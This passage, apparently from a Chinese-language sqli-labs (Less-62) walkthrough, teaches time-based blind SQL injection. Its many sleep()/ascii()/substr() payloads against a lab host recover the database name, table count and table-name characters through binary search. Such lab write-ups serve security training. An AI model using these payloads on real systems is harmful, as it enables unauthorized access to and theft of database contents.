class="hljs-number">192.168</span><span class="hljs-number">.239</span><span class="hljs-number">.138</span>:<span class="hljs-number">86</span><span class="hljs-operator">/</span>Less<span class="hljs-number">-62</span><span class="hljs-operator">/</span>index.php<span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;) and if(length(database())&gt;n , sleep(3), 1) --+</span><br><span class="hljs-string">其中，核心部分为length(database())&gt;n，length()是求得长度，database()是获取当前数据库名称，那么length(database())，就是求得当前数据库的长度，使用if嵌套后，if(1,2,3)... 意思就是如果1成立，表达式结果为2，不成立，表达式结果为3，所以利用二分法，改变n的值以及n前面的符号（&lt;,&gt;,=），不断让length(database())和不同的数字比较大小，如果成立都会执行第二个语句，也就是sleep(3)</span><br><span class="hljs-string"></span><br><span class="hljs-string">http://192.168.239.138:86/Less-62/index.php/?id=1&#x27;</span>) <span class="hljs-keyword">and</span> if(length(database())<span class="hljs-operator">&gt;</span><span class="hljs-number">9</span> , sleep(<span class="hljs-number">3</span>), <span class="hljs-number">1</span>) <span class="hljs-comment">--+</span><br>成立<br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">192.168</span><span class="hljs-number">.239</span><span class="hljs-number">.138</span>:<span class="hljs-number">86</span><span class="hljs-operator">/</span>Less<span class="hljs-number">-62</span><span class="hljs-operator">/</span>index.php<span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;) and if(length(database())&gt;10 , sleep(3), 1) --+</span><br><span class="hljs-string">不成立</span><br><span class="hljs-string">http://192.168.239.138:86/Less-62/index.php/?id=1&#x27;</span>) <span class="hljs-keyword">and</span> if(length(database())<span class="hljs-operator">=</span><span class="hljs-number">10</span> , sleep(<span class="hljs-number">3</span>), <span class="hljs-number">1</span>) <span class="hljs-comment">--+</span><br>成立，长度为<span class="hljs-number">10</span><br></code></pre></td></tr></table></figure><p>既然已经判断出了长度，就应该把每一位取出来（共10位），判断每一位大小</p><p>数据库名payload分析如下</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs sql">公式模板<br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">192.168</span><span class="hljs-number">.239</span><span class="hljs-number">.138</span>:<span class="hljs-number">86</span><span class="hljs-operator">/</span>Less<span class="hljs-number">-62</span><span class="hljs-operator">/</span>index.php<span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;) and if(ascii(substr((select database()),a,b))=c,sleep(3),1)--+</span><br><span class="hljs-string">其中，核心部分为ascii(substr((select database()),a,b))=c，select database()会返回查到数据库的名，外圈嵌套substr()截取函数，substr中参数a从1开始，表示从第一位开始截取，b从0开始表示截取长度，由于我们通常一位一位截取，所以b一般为1，因为很多数据库名，表名都是字母，字母之前比较很困难，所以将字母转成ascii码进行比较，就要用到ascii函数</span><br><span class="hljs-string"></span><br><span class="hljs-string">第一位，先和100比较</span><br><span class="hljs-string">http://192.168.239.138:86/Less-62/index.php/?id=1&#x27;</span>) <span class="hljs-keyword">and</span> if(ascii(substr((<span class="hljs-keyword">select</span> database()),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))<span class="hljs-operator">&gt;</span><span class="hljs-number">100</span>,sleep(<span class="hljs-number">5</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br>浏览器没转圈，说明比<span class="hljs-number">100</span>小，再和<span class="hljs-number">90</span>比较<br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">192.168</span><span class="hljs-number">.239</span><span class="hljs-number">.138</span>:<span class="hljs-number">86</span><span class="hljs-operator">/</span>Less<span class="hljs-number">-62</span><span class="hljs-operator">/</span>index.php<span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;) and if(ascii(substr((select database()),1,1))&gt;90,sleep(3),1)--+</span><br><span class="hljs-string">浏览器转圈，说明比90大，再和95比较</span><br><span class="hljs-string">http://192.168.239.138:86/Less-62/index.php/?id=1&#x27;</span>) <span class="hljs-keyword">and</span> if(ascii(substr((<span class="hljs-keyword">select</span> database()),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))<span class="hljs-operator">&gt;</span><span class="hljs-number">95</span>,sleep(<span class="hljs-number">3</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br>浏览器转圈，说明比<span class="hljs-number">95</span>大，再和<span class="hljs-number">98</span>比较<br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">192.168</span><span class="hljs-number">.239</span><span class="hljs-number">.138</span>:<span class="hljs-number">86</span><span class="hljs-operator">/</span>Less<span class="hljs-number">-62</span><span class="hljs-operator">/</span>index.php<span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;) and if(ascii(substr((select database()),1,1))&gt;98,sleep(3),1)--+</span><br><span class="hljs-string">浏览器转圈，说明比98大，再和99比较</span><br><span class="hljs-string">http://192.168.239.138:86/Less-62/index.php/?id=1&#x27;</span>) <span class="hljs-keyword">and</span> if(ascii(substr((<span class="hljs-keyword">select</span> database()),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))<span class="hljs-operator">&gt;</span><span class="hljs-number">98</span>,sleep(<span class="hljs-number">3</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br>浏览器转圈，说明比<span class="hljs-number">98</span>大，比<span class="hljs-number">100</span>小，比<span class="hljs-number">98</span>大，再和<span class="hljs-number">99</span>做等号比较<br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">192.168</span><span class="hljs-number">.239</span><span class="hljs-number">.138</span>:<span class="hljs-number">86</span><span class="hljs-operator">/</span>Less<span class="hljs-number">-62</span><span class="hljs-operator">/</span>index.php<span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;) and if(ascii(substr((select database()),1,1))=99,sleep(3),1)--+</span><br><span class="hljs-string">至此为止，第一位拿下，第一位的ascii码为99，去acsii码表查看，值99对应的十进制为字符c，说明数据库第一位是c</span><br><span class="hljs-string"></span><br><span class="hljs-string">以此类推，大家动手去判断一下，把公式中a从1到10，c也用刚刚的方法，每一位都判断一下，我这里的每一位结果如下</span><br><span class="hljs-string">http://192.168.239.138:86/Less-62/index.php/?id=1&#x27;</span>) <span class="hljs-keyword">and</span> if(ascii(substr((<span class="hljs-keyword">select</span> database()),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))<span class="hljs-operator">=</span><span class="hljs-number">99</span>,sleep(<span class="hljs-number">3</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">192.168</span><span class="hljs-number">.239</span><span class="hljs-number">.138</span>:<span class="hljs-number">86</span><span class="hljs-operator">/</span>Less<span class="hljs-number">-62</span><span class="hljs-operator">/</span>index.php<span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;) and if(ascii(substr((select database()),2,1))=104,sleep(3),1)--+</span><br><span class="hljs-string">http://192.168.239.138:86/Less-62/index.php/?id=1&#x27;</span>) <span class="hljs-keyword">and</span> if(ascii(substr((<span class="hljs-keyword">select</span> database()),<span class="hljs-number">3</span>,<span class="hljs-number">1</span>))<span class="hljs-operator">=</span><span class="hljs-number">97</span>,sleep(<span class="hljs-number">3</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">192.168</span><span class="hljs-number">.239</span><span class="hljs-number">.138</span>:<span class="hljs-number">86</span><span class="hljs-operator">/</span>Less<span class="hljs-number">-62</span><span class="hljs-operator">/</span>index.php<span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;) and if(ascii(substr((select database()),4,1))=108,sleep(3),1)--+</span><br><span class="hljs-string">http://192.168.239.138:86/Less-62/index.php/?id=1&#x27;</span>) <span class="hljs-keyword">and</span> if(ascii(substr((<span class="hljs-keyword">select</span> database()),<span class="hljs-number">5</span>,<span class="hljs-number">1</span>))<span class="hljs-operator">=</span><span class="hljs-number">108</span>,sleep(<span class="hljs-number">3</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">192.168</span><span class="hljs-number">.239</span><span class="hljs-number">.138</span>:<span class="hljs-number">86</span><span class="hljs-operator">/</span>Less<span class="hljs-number">-62</span><span class="hljs-operator">/</span>index.php<span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;) and if(ascii(substr((select database()),6,1))=101,sleep(3),1)--+</span><br><span class="hljs-string">http://192.168.239.138:86/Less-62/index.php/?id=1&#x27;</span>) <span class="hljs-keyword">and</span> if(ascii(substr((<span class="hljs-keyword">select</span> database()),<span class="hljs-number">7</span>,<span class="hljs-number">1</span>))<span class="hljs-operator">=</span><span class="hljs-number">110</span>,sleep(<span class="hljs-number">3</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">192.168</span><span class="hljs-number">.239</span><span class="hljs-number">.138</span>:<span class="hljs-number">86</span><span class="hljs-operator">/</span>Less<span class="hljs-number">-62</span><span class="hljs-operator">/</span>index.php<span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;) and if(ascii(substr((select database()),8,1))=103,sleep(3),1)--+</span><br><span class="hljs-string">http://192.168.239.138:86/Less-62/index.php/?id=1&#x27;</span>) <span class="hljs-keyword">and</span> if(ascii(substr((<span class="hljs-keyword">select</span> database()),<span class="hljs-number">9</span>,<span class="hljs-number">1</span>))<span class="hljs-operator">=</span><span class="hljs-number">101</span>,sleep(<span class="hljs-number">3</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">192.168</span><span class="hljs-number">.239</span><span class="hljs-number">.138</span>:<span class="hljs-number">86</span><span class="hljs-operator">/</span>Less<span class="hljs-number">-62</span><span class="hljs-operator">/</span>index.php<span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;) and if(ascii(substr((select database()),10,1))=115,sleep(3),1)--+</span><br><span class="hljs-string">每一位都出来了，ascii码分别为</span><br><span class="hljs-string">99 104 97 108 108 101 110 103 101 115</span><br><span class="hljs-string">查找ascii码，对应的字符为</span><br><span class="hljs-string">challenges</span><br><span class="hljs-string">最后不忘在验证一下，从第一位到第十位全取出来，这次就不用ascii码了，直接和字符串比较，浏览器转圈了，数据库自然就是challenges</span><br><span class="hljs-string">http://192.168.239.138:86/Less-62/index.php/?id=1&#x27;</span>) <span class="hljs-keyword">and</span> if(substr((<span class="hljs-keyword">select</span> database()),<span class="hljs-number">1</span>,<span class="hljs-number">10</span>)<span class="hljs-operator">=</span><span class="hljs-string">&#x27;challenges&#x27;</span>,sleep(<span class="hljs-number">5</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><p>爆表<br>已经知道了数据库名称，接下来该获取表的名称，思路：表个数-&gt;每张表的长度-&gt;根据每张表的长度判断每张表的每一位</p><p>表个数payload如下</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs sql">公式模板<br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">192.168</span><span class="hljs-number">.239</span><span class="hljs-number">.138</span>:<span class="hljs-number">86</span><span class="hljs-operator">/</span>Less<span class="hljs-number">-62</span><span class="hljs-operator">/</span>index.php<span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;) and if((select count(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=&#x27;</span>challenges<span class="hljs-string">&#x27;)=n,sleep(3),1)--+</span><br><span class="hljs-string">其中，核心部分为select count(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=&#x27;</span>challenges<span class="hljs-string">&#x27;)=n，</span><br><span class="hljs-string">count(TABLE_NAME)是求得表个数，where TABLE_SCHEMA=&#x27;</span>challenges<span class="hljs-string">&#x27;当数据库名称为challenges时，其实也常这么用where TABLE_SCHEMA=database()，具体怎么用看你心情，也就是说求得标的个数，和n比较，通过改变n的值以及n前面的符号（&lt;,&gt;,=），不断让count(TABLE_NAME)和不同的数字比较大小，如果成立都会执行第二个语句，也就是sleep(3)</span><br><span class="hljs-string"></span><br><span class="hljs-string">http://192.168.239.138:86/Less-62/index.php/?id=1&#x27;</span>) <span class="hljs-keyword">and</span> if((<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(TABLE_NAME) <span class="hljs-keyword">from</span> information_schema.TABLES <span class="hljs-keyword">where</span> TABLE_SCHEMA<span class="hljs-operator">=</span><span class="hljs-string">&#x27;challenges&#x27;</span>)<span class="hljs-operator">&lt;</span><span class="hljs-number">5</span>,sleep(<span class="hljs-number">3</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br>成立<br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">192.168</span><span class="hljs-number">.239</span><span class="hljs-number">.138</span>:<span class="hljs-number">86</span><span class="hljs-operator">/</span>Less<span class="hljs-number">-62</span><span class="hljs-operator">/</span>index.php<span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;) and if((select count(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=&#x27;</span>challenges<span class="hljs-string">&#x27;)&lt;3,sleep(3),1)--+</span><br><span class="hljs-string">不成立</span><br><span class="hljs-string">http://192.168.239.138:86/Less-62/index.php/?id=1&#x27;</span>) <span class="hljs-keyword">and</span> if((<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(TABLE_NAME) <span class="hljs-keyword">from</span> information_schema.TABLES <span class="hljs-keyword">where</span> TABLE_SCHEMA<span class="hljs-operator">=</span><span class="hljs-string">&#x27;challenges&#x27;</span>)<span class="hljs-operator">&lt;</span><span class="hljs-number">2</span>,sleep(<span class="hljs-number">3</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br>成立，比<span class="hljs-number">2</span>小，那应该是只有<span class="hljs-number">1</span><br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">192.168</span><span class="hljs-number">.239</span><span class="hljs-number">.138</span>:<span class="hljs-number">86</span><span class="hljs-operator">/</span>Less<span class="hljs-number">-62</span><span class="hljs-operator">/</span>index.php<span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;) and if((select count(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=&#x27;</span>challenges<span class="hljs-string">&#x27;)=1,sleep(3),1)--+</span><br><span class="hljs-string">表个数为1</span><br></code></pre></td></tr></table></figure><p>既然已经判断出了表个数，就应该判断每一张表的长度</p><p>表长度payload分析如下</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs sql">公式模板<br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">192.168</span><span class="hljs-number">.239</span><span class="hljs-number">.138</span>:<span class="hljs-number">86</span><span class="hljs-operator">/</span>Less<span class="hljs-number">-62</span><span class="hljs-operator">/</span>index.php<span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;) and if(length(select table_name from information_schema.tables where table_schema = database() limit a,b)=c,sleep(3),1)--+</span><br><span class="hljs-string">其中，核心部分为limit a,b)=c，a从0开始，表示着第a+1张表开始，即a为0，就是第一张表开始，b一般取1，表示取几张，c就是最后比较的长度，那么，下面都代表第一张表的长度，是否小于15</span><br><span class="hljs-string">http://192.168.239.138:86/Less-62/index.php/?id=1&#x27;</span>) <span class="hljs-keyword">and</span> if(length((<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema <span class="hljs-operator">=</span> database() limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>))<span class="hljs-operator">&lt;</span><span class="hljs-number">15</span>,sleep(<span class="hljs-number">3</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br>浏览器转圈，说明比<span class="hljs-number">15</span>小，再和<span class="hljs-number">10</span>比较<br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">192.168</span><span class="hljs-number">.239</span><span class="hljs-number">.138</span>:<span class="hljs-number">86</span><span class="hljs-operator">/</span>Less<span class="hljs-number">-62</span><span class="hljs-operator">/</span>index.php<span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;) and if(length((select table_name from information_schema.tables where table_schema = database() limit 0,1))&lt;10,sleep(3),1)--+</span><br><span class="hljs-string">浏览器没转圈，说明比10大或等于10，再和12比较</span><br><span class="hljs-string">http://192.168.239.138:86/Less-62/index.php/?id=1&#x27;</span>) <span class="hljs-keyword">and</span> if(length((<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema <span class="hljs-operator">=</span> database() limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>))<span class="hljs-operator">&lt;</span><span class="hljs-number">12</span>,sleep(<span class="hljs-number">3</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br>浏览器转圈，说明比<span class="hljs-number">12</span>小，再和<span class="hljs-number">11</span>比较<br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">192.168</span><span class="hljs-number">.239</span><span class="hljs-number">.138</span>:<span class="hljs-number">86</span><span class="hljs-operator">/</span>Less<span class="hljs-number">-62</span><span class="hljs-operator">/</span>index.php<span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;) and if(length((select table_name from information_schema.tables where table_schema = database() limit 0,1))&lt;11,sleep(3),1)--+</span><br><span class="hljs-string">浏览器转圈，说明比11小，直接10比较</span><br><span class="hljs-string">http://192.168.239.138:86/Less-62/index.php/?id=1&#x27;</span>) <span class="hljs-keyword">and</span> if(length((<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema <span class="hljs-operator">=</span> database() limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>))<span class="hljs-operator">=</span><span class="hljs-number">10</span>,sleep(<span class="hljs-number">3</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br>浏览器转圈，说明第一张表的长度为<span class="hljs-number">10</span><br>由于这里只有一张表，那么我们只做这第一张表的判断，往后，通过改变a的值（b就取默认为<span class="hljs-number">1</span>不要变），来判断第<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4.</span>..表<br></code></pre></td></tr></table></figure><p>把每一张表的每一位取出来（共1张表），判断每一位大小，也就是表名，这里和数据库名方法类似</p><p>表名payload分析如下</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs sql">http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">192.168</span><span class="hljs-number">.239</span><span class="hljs-number">.138</span>:<span class="hljs-number">86</span><span class="hljs-operator">/</span>Less<span class="hljs-number">-62</span><span class="hljs-operator">/</span>index.php<span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;) and if(ascii(substr((select table_name from information_schema.tables where table_schema = database() limit a,b),c,d))&gt;n,sleep(3),1)--+</span><br><span class="hljs-string">其中，核心部分为limit a,b),c,d))&gt;n，b和d一般默认为1，a从0开始，表示着第a+1张表开始，即a为0，就是第一张表开始，c从1开始，表示着从表名的第一位开始，那么，下面都代表第一张表的第一位的ascii码，是否大于100</span><br><span class="hljs-string">http://192.168.239.138:86/Less-62/index.php/?id=1&#x27;</span>) <span class="hljs-keyword">and</span> if(ascii(substr((<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema <span class="hljs-operator">=</span> database() limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))<span class="hljs-operator">&gt;</span><span class="hljs-number">100</span>,sleep(<span class="hljs-number">3</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br><br>第一位，先和<span class="hljs-number">100</span>比较<br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">192.168</span><span class="hljs-number">.239</span><span class="hljs-number">.138</span>:<span class="hljs-number">86</span><span class="hljs-operator">/</span>Less<span class="hljs-number">-62</span><span class="hljs-operator">/</span>index.php<span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;) and if(ascii(substr((select table_name from information_schema.tables where table_schema = database() limit 0,1),1,1))&gt;100,sleep(3),1)--+</span><br><span class="hljs-string">浏览器转圈，说明比100大，再和120比较</span><br><span class="hljs-string">http://192.168.239.138:86/Less-62/index.php/?id=1&#x27;</span>) <span class="hljs-keyword">and</span> if(ascii(substr((<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema <span class="hljs-operator">=</span> database() limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))<span class="hljs-operator">&gt;</span><span class="hljs-number">120</span>,sleep(<span class="hljs-number">3</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br>浏览器没转圈，说明比<span class="hljs-number">120</span>小，再和<span class="hljs-number">110</span>比较<br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">192.168</span><span class="hljs-number">.239</span><span class="hljs-number">.138</span>:<span class="hljs-number">86</span><span class="hljs-operator">/</span>Less<span class="hljs-number">-62</span><span class="hljs-operator">/</span>index.php<span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;) and if(ascii(substr((select table_name from information_schema.tables where table_schema = database() limit 0,1),1,1))&gt;110,sleep(3),1)--+</span><br><span class="hljs-string">浏览器没转圈，说明比110小，再和105比较</span><br><span class="hljs-string">http://192.168.239.138:86/Less-62/index.php/?id=1&#x27;</span>) <span class="hljs-keyword">and</span> if(ascii(substr((<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema <span class="hljs-operator">=</span> database() limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))<span class="hljs-operator">&gt;</span><span class="hljs-number">105</span>,sleep(<span class="hljs-number">3</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br>浏览器转圈，说明比<span class="hljs-number">105</span>大，再和<span class="hljs-number">107</span>比较<br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">192.168</span><span class="hljs-number">.239</span><span class="hljs-number">.138</span>:<span class="hljs-number">86</span><span class="hljs-operator">/</span>Less<span class="hljs-number">-62</span><span class="hljs-operator">/</span>index.php<span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;) and if(ascii(substr((select table_name from information_schema.tables where table_schema = database() limit 0,1),1,1))&gt;107,sleep(3),1)--+</span><br><span class="hljs-string">浏览器转圈，说明比107大，再和109比较</span><br><span class="hljs-string">http://192.168.239.138:86/Less-62/index.php/?id=1&#x27;</span>) <span class="hljs-keyword">and</span> if(ascii(substr((<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema <span class="hljs-operator">=</span> database() limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))<span class="hljs-operator">&lt;</span><span class="hljs-number">109</span>,sleep(<span class="hljs-number">3</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br>浏览器转圈，说明比<span class="hljs-number">109</span>小，比<span class="hljs-number">109</span>小，比<span class="hljs-number">107</span>大，再和<span class="hljs-number">108</span>做等号比较<br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">192.168</span><span class="hljs-number">.239</span><span class="hljs-number">.138</span>:<span class="hljs-number">86</span><span class="hljs-operator">/</span>Less<span class="hljs-number">-62</span><span class="hljs-operator">/</span>index.php<span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;) and if(ascii(substr((select table_name from information_schema.tables where table_schema = database() limit 0,1),1,1))=108,sleep(3),1)--+</span><br><span class="hljs-string">至此为止，第一位拿下，第一位的ascii码为108，去acsii码表查看，值108对应的十进制为字符l，说明第一张表的第一位是l</span><br><span class="hljs-string"></span><br><span class="hljs-string">以此类推，大家动手去判断一下，把公式中c从1到10，因为本关只有一张表，所以a都是0，每一位都判断一下，我这里的每一位结果如下</span><br><span class="hljs-string">http://192.168.239.138:86/Less-62/index.php/?id=1&#x27;</span>) <span class="hljs-keyword">and</span> if(ascii(substr((<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema <span class="hljs-operator">=</span> database() limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))<span class="hljs-operator">=</span><span class="hljs-number">108</span>,sleep(<span class="hljs-number">3</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">192.168</span><span class="hljs-number">.239</span><span class="hljs-number">.138</span>:<span class="hljs-number">86</span><span class="hljs-operator">/</span>Less<span class="hljs-number">-62</span><span class="hljs-operator">/</span>index.php<span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;) and if(ascii(substr((select table_name from information_schema.tables where table_schema = database() limit 0,1),2,1))=114,sleep(3),1)--+</span><br><span class="hljs-string">http://192.168.239.138:86/Less-62/index.php/?id=1&#x27;</span>) <span class="hljs-keyword">and</span> if(ascii(substr((<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema <span class="hljs-operator">=</span> database() limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">3</span>,<span class="hljs-number">1</span>))<span class="hljs-operator">=</span><span class="hljs-number">113</span>,sleep(<span class="hljs-number">3</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">192.168</span><span class="hljs-number">.239</span><span class="hljs-number">.138</span>:<span 